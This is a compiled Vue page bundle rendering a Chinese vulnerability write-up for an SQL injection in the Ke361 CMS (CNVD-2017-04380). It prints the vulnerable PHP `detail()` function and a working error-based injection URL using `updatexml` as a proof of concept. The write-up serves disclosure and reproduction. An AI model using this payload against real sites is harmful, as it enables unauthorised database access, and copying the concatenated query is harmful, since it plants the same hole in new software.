import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as d,a as e,b as l,d as o,e as i}from"./app-58e4a7d6.js";const r={},c=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Ke361 TopicController.class.php 文件中 detai() 函数中存在 SQL注入漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Ke361
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),p={href:"https://gitee.com/jcove/ke361",target:"_blank",rel:"noopener noreferrer"},v=i(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>存在漏洞的文件为 Application/Home/Controller/TopicController.class.php, 漏洞函数详情</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181537005.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function detail(){
         $id = I(&#39;id&#39;);
         $where[&#39;tid&#39;] = $id;
         $TopicModel = new TopicModel();
         $topicInfo = $TopicModel-&gt;info($id);
        //  if(empty($topicInfo)){
        //      $this-&gt;error(&#39;您查看的专题不存在哦！&#39;);
        //  }
  			//  这里注释掉，默认不存在专题
         M(&#39;Topic&#39;)-&gt;where(&#39;id=&#39;.$id)-&gt;setInc(&#39;hits&#39;);
         $this-&gt;setSiteTitle($topicInfo[&#39;title&#39;]);
         $goods = $this-&gt;lists(D(&#39;Goods&#39;),$where);
         foreach ($goods as $k=&gt;$v){
             $goods[$k][&#39;url&#39;] = U(&#39;/goods/&#39;.$v[&#39;id&#39;]);
         }
         $this-&gt;assign(&#39;goods&#39;,$goods);
         $this-&gt;assign(&#39;topic&#39;,$topicInfo);
         $this-&gt;display();
     }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里接收参数 id，然后执行SQL语句, 通过报错注入可以获取数据库数据</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/index.php?s=/Topic/detail/id/1)%20%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181537557.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181537004.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8);function h(u,g){const n=t("ExternalLinkIcon");return s(),d("div",null,[c,e("p",null,[e("a",p,[l("https://gitee.com/jcove/ke361"),o(n)])]),v])}const f=a(r,[["render",h],["__file","Ke361 TopicController.class.php SQL注入漏洞 CNVD-2017-04380.html.vue"]]);export{f as default};
